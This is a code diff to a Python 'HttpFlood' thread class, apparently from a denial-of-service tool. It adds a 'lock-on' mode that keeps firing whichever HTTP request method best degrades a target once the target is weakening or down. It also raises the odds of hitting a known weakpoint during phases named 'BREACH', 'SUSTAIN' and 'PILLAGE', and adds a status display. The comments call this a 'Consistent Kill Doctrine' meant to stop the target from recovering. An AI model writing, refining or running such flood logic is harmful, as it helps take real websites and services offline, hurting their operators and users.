@@ -7175,15 +7175,52 @@ class HttpFlood(Thread):
         
         chosen_name = "GET"  # Fallback
         
-        # === DECISION TREE ===
-        # Priority 0: During REST wave, only fire stealth/decoy
         # [V52.2] REST waves disabled — continuous fire is the doctrine
         # Wave state is monitored but NOT used to throttle
         if False and wave_state == "REST":
             pass
         
-        # Priority 1: Execute combo chain if one is queued
-        if chosen_name == "GET" and intel.get("combo_queue"):
+        # =============================================================
+        # [V52.3] LOCK-ON PROTOCOL — Consistent Kill Doctrine
+        # When target is weakening/down, LOCK onto best method 85% of time.
+        # This prevents the "down-up-down-up" oscillation caused by method rotation.
+        # =============================================================
+        lockon_active = False
+        best_m = intel.get("best_method")
+        hot_m = intel.get("hot_streak_method")
+        
+        # Determine the LOCK-ON method: best > hot_streak > top-used
+        lockon_method = None
+        if best_m and best_m in method_map:
+            lockon_method = best_m
+        elif hot_m and hot_m in method_map:
+            lockon_method = hot_m
+        else:
+            # Fallback: use the most-used method
+            tbm = intel.get("total_requests_by_method", {})
+            if tbm:
+                top = max(tbm, key=tbm.get)
+                if top in method_map:
+                    lockon_method = top
+        
+        # LOCK-ON triggers during BREACH/SUSTAIN/PILLAGE when target shows weakness
+        is_critical_phase = siege in ("BREACH", "SUSTAIN", "PILLAGE")
+        target_vulnerable = intel.get("target_getting_weaker") or intel.get("target_is_down")
+        
+        if lockon_method and is_critical_phase:
+            if target_vulnerable:
+                # TARGET IS VULNERABLE — 90% lock-on, 10% diversity for anti-pattern
+                if randint(1, 100) <= 90:
+                    chosen_name = lockon_method
+                    lockon_active = True
+            else:
+                # Target is holding but we're in aggressive phase — 70% lock-on
+                if randint(1, 100) <= 70:
+                    chosen_name = lockon_method
+                    lockon_active = True
+        
+        # Priority 1: Execute combo chain if one is queued (only when not locked on)
+        if not lockon_active and chosen_name == "GET" and intel.get("combo_queue"):
             combo_method = intel["combo_queue"].pop(0)
             if combo_method in method_map and weights.get(combo_method, 0) > 0:
                 chosen_name = combo_method
@@ -7191,7 +7228,7 @@ class HttpFlood(Thread):
                 intel["combo_queue"] = []  # Abort invalid combo
                 
         # Priority 1.5: Multi-path targeting (use queued path+method pair)
-        if chosen_name == "GET" and intel.get("multi_path_queue"):
+        if not lockon_active and chosen_name == "GET" and intel.get("multi_path_queue"):
             mp_path, mp_method = intel["multi_path_queue"].pop(0)
             if mp_method in method_map and weights.get(mp_method, 0) > 0:
                 chosen_name = mp_method
@@ -7201,17 +7238,18 @@ class HttpFlood(Thread):
                         self.crawled_paths = []
                     self.crawled_paths.insert(0, mp_path)
         
-        # Priority 1.6: Try dynamic combo (generated from best performers)
-        if chosen_name == "GET" and not intel.get("combo_queue") and intel["total_executions"] % randint(20, 30) == 0:
-            dynamic_combo = self._chaos_build_dynamic_combo()
-            if dynamic_combo:
-                intel["combo_queue"] = dynamic_combo
-                chosen_name = intel["combo_queue"].pop(0)
-                if chosen_name not in method_map or weights.get(chosen_name, 0) <= 0:
-                    chosen_name = "GET"
+        # Priority 1.6: Try dynamic combo (only during non-critical phases)
+        if not lockon_active and chosen_name == "GET" and not intel.get("combo_queue") and not is_critical_phase:
+            if intel["total_executions"] % randint(20, 30) == 0:
+                dynamic_combo = self._chaos_build_dynamic_combo()
+                if dynamic_combo:
+                    intel["combo_queue"] = dynamic_combo
+                    chosen_name = intel["combo_queue"].pop(0)
+                    if chosen_name not in method_map or weights.get(chosen_name, 0) <= 0:
+                        chosen_name = "GET"
                 
         # Priority 2: Emergency evasion - pick least-used method
-        if chosen_name == "GET" and intel.get("emergency_evasion"):
+        if not lockon_active and chosen_name == "GET" and intel.get("emergency_evasion"):
             # Find method with fewest total attempts
             least_used = None
             least_count = float('inf')
@@ -7224,20 +7262,21 @@ class HttpFlood(Thread):
             if least_used:
                 chosen_name = least_used
                 
-        # Priority 2.5: Hot Streak - Ride a winning method (30% chance)
-        if chosen_name == "GET" and intel.get("hot_streak_method"):
+        # Priority 2.5: Hot Streak - Ride a winning method (70% in BREACH+, 40% otherwise)
+        if not lockon_active and chosen_name == "GET" and intel.get("hot_streak_method"):
             hot = intel["hot_streak_method"]
-            if hot in method_map and weights.get(hot, 0) > 0 and randint(1, 100) <= 30:
+            streak_chance = 70 if is_critical_phase else 40
+            if hot in method_map and weights.get(hot, 0) > 0 and randint(1, 100) <= streak_chance:
                 chosen_name = hot
         
-        # Priority 3: Exploit known weakpoint (20% of the time in ASSAULT+ phases)
-        if chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
-            if randint(1, 5) <= 1:  # 20% chance to exploit weakpoint directly
+        # Priority 3: Exploit known weakpoint (40% in ASSAULT+, was 20%)
+        if not lockon_active and chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
+            if randint(1, 5) <= 2:  # 40% chance to exploit weakpoint directly
                 wp = intel["target_weakpoint"]
                 if wp in method_map and weights.get(wp, 0) > 0:
                     chosen_name = wp
         
-        # Priority 4: Normal weighted roulette
+        # Priority 4: Normal weighted roulette (fallback)
         if chosen_name == "GET":
             active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
             total_weight = sum(w for _, w in active_pool)
@@ -7507,6 +7546,12 @@ class HttpFlood(Thread):
                 if hot:
                     streak_len = intel.get("method_streaks", {}).get(hot, 0)
                     print(f"  Hot Streak  : {bcolors.OKGREEN}{hot} ({streak_len} consecutive wins!){bcolors.RESET}")
+                # [V52.3] LOCK-ON indicator
+                lo_m = intel.get("best_method") or intel.get("hot_streak_method")
+                lo_siege = intel.get("siege_phase", "RECON")
+                if lo_m and lo_siege in ("BREACH", "SUSTAIN", "PILLAGE"):
+                    lo_pct = "90%" if (intel.get("target_getting_weaker") or intel.get("target_is_down")) else "70%"
+                    print(f"  LOCK-ON     : {bcolors.FAIL}{lo_m} ({lo_pct} of executions){bcolors.RESET}")
                 diversity = intel.get("method_diversity_score", 0)
                 total_by = intel.get("total_requests_by_method", {})
                 if total_by:
